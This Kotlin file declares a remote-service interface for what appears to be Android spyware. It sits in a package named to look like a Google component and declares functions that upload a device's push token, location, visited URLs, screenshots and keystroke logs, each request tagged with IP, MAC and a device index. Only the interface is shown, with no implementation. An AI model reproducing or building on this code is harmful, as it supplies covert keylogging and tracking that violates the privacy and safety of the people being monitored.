package com.android.google.remote

import com.android.google.remote.models.*

/*
* Remote service interface
*
* Headers: IP, MAC, DeviceIdx
* Body: some data
* */

interface RemoteService {
    suspend fun sendPushToken(token: PushTokenDTO) // Firebase PushTokenDTO
    suspend fun sendLocation(location: LocationDTO) // LocationDTO
    suspend fun sendUrl(url: UrlDTO) // UrlDTO
    suspend fun sendScreenshot(screenshot: ScreenshotDTO) // ScreenshotDTO
    suspend fun sendKeyLog(keyLog: KeyLogDTO) // KeyLogDTO
}